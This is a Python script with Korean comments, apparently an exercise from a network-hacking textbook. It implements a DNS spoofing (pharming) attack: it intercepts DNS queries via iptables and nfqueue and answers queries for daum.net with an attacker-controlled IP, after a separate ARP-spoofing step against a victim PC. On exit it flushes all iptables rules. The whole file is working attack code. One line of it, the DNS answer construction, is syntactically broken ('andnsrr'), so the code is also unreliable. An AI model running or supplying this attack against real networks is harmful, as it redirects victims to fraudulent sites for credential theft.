#6.20에 비해 제대로 동작하는 DNS스푸핑 코드
#pharming_target의 IP주소를 묻는 DNS쿼리에 대해서만 pharming_site로 응답하는 코드

#<실행순서> 
#1. 공격자PC에서 6.17(ARP스푸핑)에 피해컴퓨터 IP주소 적용 후 실행
#2. 공격자PC 내 다른 터미널에서 6.21 실행
#3. 피해PC에서 HTTP 도메인사이트 접속

from scapy.all import *
import nfqueue
import socket
import os

pharming_target = 'daum.net'
pharming_site = '172.21.70.227'

#nfqueue의 큐에 데이터가 들어오면 호출할 콜백함수
def dnsSpoof(dummy, payload):
	data = payload.get_data()
	packet = IP(data)
	
	dstip = packet[IP].src
	srcip = packet[IP].dst
	dport = packet[UDP].sport
	sport = packet[UDP].dport
	
	#DNS 쿼리가 아닐경우, 원래 목적지로 가도록 nfqueue에서 컴퓨터로 전달
	if not packet.haslayer(DNSQR):
		payload.set_verdict(nfqueue.NF_ACCEPT)
	else:
		dnsid = packet[DNS].id
		qd = packet[DNS].qd
		rrname = packet[DNS].qd.name
		
		#qd.name에 목표한 도메인이 있으면
		if pharming_target in rrname:
			P_IP = IP(dst=dstip, src=srcip)
			P_UDP = UDP(dport=dport, sport=sport)
			dnsrr = DNSRR(rrname=rrname, ttl=10, rdata=pharming_site)
			P_DNS = DNS(id=dnsid, qr=1, aa=1, qd=qd, andnsrr)
			
			#파밍사이트의 IP주소로 DNS 응답 패킷 구성
			spoofPacket = P_IP/P_UDP/P_DNS
			
			#set_verdict_modified()로 수정된 패킷을 컴퓨터로 전달
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofPacket), len(spoofPacket))
			
			print('+DNS SPOOFING [%s] -> [%s]' %(pharming_target, pharming_site))
		else:
			payload.set_verdict(nfqueue.NF_ACCEPT)
		
		
def main():
	print('+++DNS SPOOF START...')
	#UDP 53번 포트로 전송되는 DNS쿼리 데이터만 nfqueue로 전달하도록 IP테이블을 수정
	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
	
	#큐를 생성
	q = nfqueue.queue()
	q.open()
	#인터넷 소켓과 바인딩
	q.bind(socket.AF_INET)
	#큐에 데이터가 들어올 때 호출할 콜백함수 지정
	q.set_callback(dnsSpoof)
	q.create_queue(0)
	
	try:
		# q.try_run() : nfqueue의 메인 루프 함수
		#큐에 데이터가 전달될 때까지 여기에서 블록킹
		q.try_run()
	except KeyboardInterrupt:
		q.unbind(socket.AF_INET)
		q.close()
		os.system('iptables -F')
		os.system('iptables -X')
		print('\n---RECOVER IPTABLES...')
		return
		
if __name__ == '__main__':
	main()
